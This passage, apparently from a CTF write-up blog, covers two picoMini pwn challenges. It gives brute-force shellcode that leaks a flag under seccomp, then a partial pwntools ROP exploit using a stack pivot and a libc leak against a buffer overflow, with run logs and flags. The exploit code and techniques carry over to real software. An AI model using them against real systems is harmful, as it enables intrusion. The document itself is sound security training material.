+  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(ctx </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">NULL </span><span style="color:#f29e74;">||</span><span style="color:#ccc9c2;"> ret)
+    </span><span style="color:#ffd580;">error</span><span style="color:#ccc9c2;">(EXIT_FAILURE</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;seccomp&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">}
+
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">()
+{
+  </span><span style="color:#f28779;">setbuf</span><span style="color:#ccc9c2;">(stdout</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">setbuf</span><span style="color:#ccc9c2;">(stdin</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">setbuf</span><span style="color:#ccc9c2;">(stderr</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+
+  </span><span style="color:#ffd580;">load_flag</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">puts</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Welcome to Shellcode as a Service!&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+
+  </span><span style="color:#ffa759;">void</span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;"> addr </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">mmap</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x1000</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> PROT_EXEC </span><span style="color:#f29e74;">|</span><span style="color:#ccc9c2;"> PROT_READ </span><span style="color:#f29e74;">|</span><span style="color:#ccc9c2;"> PROT_WRITE</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> MAP_PRIVATE </span><span style="color:#f29e74;">|</span><span style="color:#ccc9c2;"> MAP_ANON</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#f28779;">memcpy</span><span style="color:#ccc9c2;">(addr</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> HEADER</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">sizeof</span><span style="color:#ccc9c2;">(HEADER))</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> addr </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">sizeof</span><span style="color:#ccc9c2;">(HEADER) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> SIZE)</span><span style="color:#ccc9c2cc;">;
+
+  </span><span style="color:#ffd580;">setup</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">goto </span><span style="color:#f29e74;">*</span><span style="color:#ccc9c2;">addr</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">}
+</span></code></pre>
+<p>It'll read 0x100 bytes into executable memory and then execute it with the flag in memory. The catch? We're operating under seccomp (can do nothing besides write to stdout and exit) and the header resets every register except RIP. Additionally, we're executing in mmapped memory so we can't correlate the instruction pointer to the program base. So, what do we do?</p>
+<h2 id="i-would-simply-brute-force-it-me">&quot;I would simply brute force it&quot; - me</h2>
+<p>We don't have a lot of information to work with -- in fact, almost nothing. What we <em>do</em> have is a write syscall and the fact that segmentation faults in a syscall won't propagate to the parent program. If we check address via a shellcode brute forcer thats an address every like 8 cpu instructions. That's looking quite tractable. </p>
+<p>I wrote a quick python script to get reasonable lower bounds on program base (aka run it 1000 times and see my min/max look like) and then got to writing shellcode. </p>
+<pre style="background-color:#212733;">
+<code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">os
+</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">tqdm</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">contrib</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">concurrent </span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">process_map
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">get_base</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">a</span><span style="color:#ccc9c2;">):
+	base </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">popen</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;&quot;&quot;gdb chall --batch --nx --ex &quot;set disable-randomization off&quot; --ex &quot;b main&quot; --ex &quot;r&quot; --ex &quot;info proc map&quot; | grep &quot;0x0 /home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall&quot; | tr -s &#39; &#39; | cut -d&#39; &#39; -f2 &quot;&quot;&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">()
+	</span><span style="color:#ffa759;">return </span><span style="font-style:italic;color:#5ccfe6;">int</span><span style="color:#ccc9c2;">(base</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2;">)
+
+</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;__main__&#39;</span><span style="color:#ccc9c2;">:
+   bases </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">process_map</span><span style="color:#ccc9c2;">(get_base</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">range</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1000</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">max_workers</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">20</span><span style="color:#ccc9c2;">)
+   </span><span style="color:#f28779;">print</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;[*] min base: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(</span><span style="color:#f28779;">min</span><span style="color:#ccc9c2;">(bases)))
+   </span><span style="color:#f28779;">print</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;[*] max base: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(</span><span style="color:#f28779;">max</span><span style="color:#ccc9c2;">(bases)))
+</span></code></pre><pre style="background-color:#212733;">
+<code class="language-nasm" data-lang="nasm"><span style="color:#ffa759;">mov </span><span style="color:#ffcc66;">r10</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">0x555572800000
+</span><span style="color:#ffa759;">add </span><span style="color:#ffcc66;">r10</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">0x202060
+</span><span style="color:#ffd580;">/</span><span style="color:#ccc9c2;">* </span><span style="color:#ffd580;">jump here </span><span style="color:#ccc9c2;">*</span><span style="color:#ffd580;">/
+</span><span style="color:#ffa759;">add </span><span style="color:#ffcc66;">r10</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">1048576
+
+</span><span style="color:#ffa759;">mov </span><span style="color:#ffcc66;">rax</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">1
+</span><span style="color:#ffa759;">mov </span><span style="color:#ffcc66;">rdi</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">1
+</span><span style="color:#ffa759;">mov </span><span style="color:#ffcc66;">rsi</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">r10
+</span><span style="color:#ffa759;">mov </span><span style="color:#ffcc66;">rdx</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">100
+</span><span style="color:#ffa759;">syscall
+cmp </span><span style="color:#ffcc66;">rax</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">0
+</span><span style="color:#ffa759;">jle </span><span style="color:#ffd580;">$</span><span style="color:#ccc9c2;">-</span><span style="color:#ffcc66;">0x25
+</span><span style="color:#ffa759;">mov </span><span style="color:#ffcc66;">rax</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">60
+</span><span style="color:#ffa759;">mov </span><span style="color:#ffcc66;">rdi</span><span style="color:#ccc9c2;">, </span><span style="color:#ffcc66;">0
+</span><span style="color:#ffa759;">syscall
+</span></code></pre>
+<p>The logic looks like this</p>
+<ol>
+<li>prep base address</li>
+<li>try and write to stdout</li>
+<li>if it errors (EFAULT is -14, so less than 0) increment by 2^20 (unrandomized segment of the address) and try again</li>
+<li>otherwise, exit</li>
+</ol>
+<p>Time varies a little bit, but on my machine I get the flag in about a second. </p>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ python solve.py
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Starting local process &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall&#39;: pid 50338
+[+] Receiving all data: Done (135B)
+[*] Process &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall&#39; stopped with exit code 0 (pid 50338)
+picoCTF{placeholder}
+</span></code></pre>
+<p>I rerun the solver on remote... and find that it times out. What gives? Well, as it turns out the docker container enforces some rather strict CPU usage limits and also their server is probably under higher load than my desktop. Armed with the knowledge that <em>theoretically</em> this should work and all I needed to do was get lucky and have the program base be in the range I can check in 30 seconds I decided to do the only reasonable thing!  Run it in a loop until it prints a flag and then get lunch. </p>
+<p>30 minutes later the flag is mine! (or more like 3 minutes, I got lucky when i was rerunning it for the writeup lol)</p>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ python solve.py REMOTE
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to mars.picoctf.net on port 31021: Done
+[+] Receiving all data: Done (35B)
+[*] Closed connection to mars.picoctf.net port 31021
+[+] Opening connection to mars.picoctf.net on port 31021: Done
+[+] Receiving all data: Done (35B)
+[*] Closed connection to mars.picoctf.net port 31021
+[+] Opening connection to mars.picoctf.net on port 31021: Done
+[+] Receiving all data: Done (35B)
+[*] Closed connection to mars.picoctf.net port 31021
+[+] Opening connection to mars.picoctf.net on port 31021: Done
+[+] Receiving all data: Done (35B)
+[*] Closed connection to mars.picoctf.net port 31021
+[+] Opening connection to mars.picoctf.net on port 31021: Done
+[+] Receiving all data: Done (135B)
+[*] Closed connection to mars.picoctf.net port 31021
+picoCTF{f0ll0w_th3_m4p_t0_g3t_th3_fl4g}
+</span></code></pre><h1 id="lockdown-horses">lockdown-horses</h1>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">Here at Moar Horse Industries, we believe, especially during these troubling times, that everyone should be able to make a horse say whatever they want.
+
+We were tired of people getting shells everywhere, so now it should be impossible! Can you still find a way to rope yourself out of this one?
+
+Flag is in the current directory. seccomp-tools might be helpful.
+
+nc mars.picoctf.net 31809
+</span></code></pre>
+<p>We're provided a <a href="/ctf/picomini-by-redpwn/lockdown-horses/horse">binary</a> and a <a href="/ctf/picomini-by-redpwn/lockdown-horses/Dockerfile">Dockerfile</a> . </p>
+<h2 id="analysis">analysis</h2>
+<p>First order of business is to do what the prompt says and check out the seccomp restrictions. </p>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ seccomp-tools dump ./horse
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x13 0xc000003e  if (A != ARCH_X86_64) goto 0021
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x10 0xffffffff  if (A != 0xffffffff) goto 0021
+ 0005: 0x15 0x0e 0x00 0x00000002  if (A == open) goto 0020
+ 0006: 0x15 0x0d 0x00 0x00000009  if (A == mmap) goto 0020
+ 0007: 0x15 0x0c 0x00 0x0000003c  if (A == exit) goto 0020
+ 0008: 0x15 0x0b 0x00 0x000000d9  if (A == getdents64) goto 0020
+ 0009: 0x15 0x0a 0x00 0x000000e7  if (A == exit_group) goto 0020
+ 0010: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0015
+ 0011: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)
+ 0012: 0x15 0x00 0x08 0x00000000  if (A != 0x0) goto 0021
+ 0013: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
+ 0014: 0x15 0x05 0x06 0x00000000  if (A == 0x0) goto 0020 else goto 0021
+ 0015: 0x15 0x00 0x05 0x00000001  if (A != write) goto 0021
+ 0016: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # write(fd, buf, count)
+ 0017: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0021
+ 0018: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)
+ 0019: 0x15 0x00 0x01 0x00000001  if (A != 0x1) goto 0021
+ 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0021: 0x06 0x00 0x00 0x00000000  return KILL
+</span></code></pre>
+<p>Not a lot to work with; mmap, open, getdents, read from stdin, and write to stdout. Looks like we aren't getting a shell here. </p>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ checksec horse
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/lockdown-horses/horse&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3fe000)
+    RUNPATH:  b&#39;.&#39;
+</span></code></pre>
+<p>Mitigations look wide open, at least.  Let's see what we have to work with vulnerability wise. </p>
+<h2 id="vulnerability">vulnerability</h2>
+<pre style="background-color:#212733;">
+<code class="language-c" data-lang="c"><span style="color:#ccc9c2;">undefined8 </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">void</span><span style="color:#ccc9c2;">)
+
+{
+  undefined local_28 [</span><span style="color:#ffcc66;">32</span><span style="color:#ccc9c2;">]</span><span style="color:#ccc9c2cc;">;
+  
+  </span><span style="color:#ffd580;">setup</span><span style="color:#ccc9c2;">()</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;">local_28</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x80</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffd580;">horse</span><span style="color:#ccc9c2;">(local_28)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">}
+</span></code></pre>
+<p>oh ok kinda trivial vulnerability. We get 96 bytes of overflow, which accounting for the stored RBP gives us 11 pointers worth of ROP chain. </p>
+<h2 id="exploitation-1">exploitation</h2>
+<p>So to sum it up, we can ROP 11 times, we have like 5 file i/o syscalls, and the flag has an unknown filename. Our solution is gonna look like this, roughly:</p>
+<ol>
+<li>use getdents64 to leak filename</li>
+<li>mmap the flag</li>
+<li>write the flag to stdout. </li>
+</ol>
+<p>The issue is we're somewhat starved for gadgets (can control rdi and rsi, don't have rdx onwards) and so argument control is kinda hard. There are things we could do to get around this potentially -- I found that calling strlen copied rdi to rdx, letting me get a very large rdx value at least. But even with that, we are still heavily limited in what we can do with only 11 returns. The saving grace is this lovely gadget &quot;pop rsp; pop r13; pop r14; pop r15; ret;&quot;. Instead of trying to manage the full exploit in 11 returns, we can just write as long a chain as we want to writable program memory and then pivot the stack onto it. At that point, we can just ROP as usual. Leak the base of libc, mmap some rwx memory, write shellcode, leak the filename with getdents64, and then mmap and write. </p>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ python solve.py REMOTE
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/lockdown-horses/horse&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x3fe000)
+    RUNPATH:  b&#39;.&#39;
+[+] Opening connection to mars.picoctf.net on port 31809: Done
+128
+/home/sky/Dropbox/ctf/picomini-by-redpwn/lockdown-horses/solve.py:36: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  r.recvuntil(&quot;/     /   &quot;)
+[*] leaked libc_base: 0x7f3c2deff000
+[*] leaked flag filename: flag-b1a750d7-91bf-43ab-8c81-4b504644b434.txt
+[*] Switching to interactive mode
+picoCTF{n0_sh3ll_v3ry_flag_xdd}
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
+$  
+</span></code></pre><pre style="background-color:#212733;">
+<code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+
+</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">time
+</span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">re
+exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;horse&quot;</span><span style="color:#ccc9c2;">)
+
+context</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">binary </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">exe
+context</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+
+</span><span style="color:#ccc9c2;">pop_rdi </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0000000000400c03
+</span><span style="color:#ccc9c2;">pop_rsi_r15 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0000000000400c01
+</span><span style="color:#ccc9c2;">pop_rsp_r13_r14_r15 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0000000000400bfd
+
+</span><span style="color:#ccc9c2;">offset_read </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0000000000111130
+</span><span style="color:#ccc9c2;">offset_mmap </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x000000000011ba20
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">():
+    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">args</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">REMOTE:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;mars.picoctf.net&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">31809</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffa759;">elif </span><span style="color:#ccc9c2;">args</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">GDB:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span style="color:#ccc9c2;">([exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path]</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">gdbscript</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;b *main+58</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">c</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">ni 3</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">fin</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">ni 5</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">fin</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">ni 10</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">fin</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">ni 5</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">fin</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">ni 20</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">fin</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">ni 3</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">fin</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">ni 5&quot;</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffa759;">else</span><span style="color:#ccc9c2;">:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span style="color:#ccc9c2;">([exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path])
+
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">():
+    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">()
+
+
+    </span><span style="font-style:italic;color:#5c6773;"># call strlen to get big number in rdx (i didn&#39;t bother to look at the source i just know it works lol)
+    # read a second, larger ROP chain into writable program memory
+    # pivot onto that program memory
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">40
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdi)  </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x400ce0</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">symbols[</span><span style="color:#bae67e;">&#39;strlen&#39;</span><span style="color:#ccc9c2;">])
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rsi_r15) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x602000</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">symbols[</span><span style="color:#bae67e;">&#39;read&#39;</span><span style="color:#ccc9c2;">])
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rsp_r13_r14_r15) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x602000</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span style="color:#ccc9c2;">(payload)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;/     /   &quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span style="color:#ccc9c2;">()
+
+
+    </span><span style="font-style:italic;color:#5c6773;"># leak libc base by writing GOT
+    # call read again so we can write another ROP chain with libc gadgets
+    # pivot stack onto our new chain
+
+
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">24 </span><span style="font-style:italic;color:#5c6773;"># need padding bc our stack pivot gadget has three pops between pop rsp and ret
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rsi_r15) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">got[</span><span style="color:#bae67e;">&quot;read&quot;</span><span style="color:#ccc9c2;">]) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">symbols[</span><span style="color:#bae67e;">&#39;write&#39;</span><span style="color:#ccc9c2;">])
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rdi) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rsi_r15) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x6020c0</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">symbols[</span><span style="color:#bae67e;">&#39;read&#39;</span><span style="color:#ccc9c2;">])
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(pop_rsp_r13_r14_r15) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x6020c0</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(payload)
+    read_address </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u64</span><span style="color:#ccc9c2;">(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recv</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2;">))
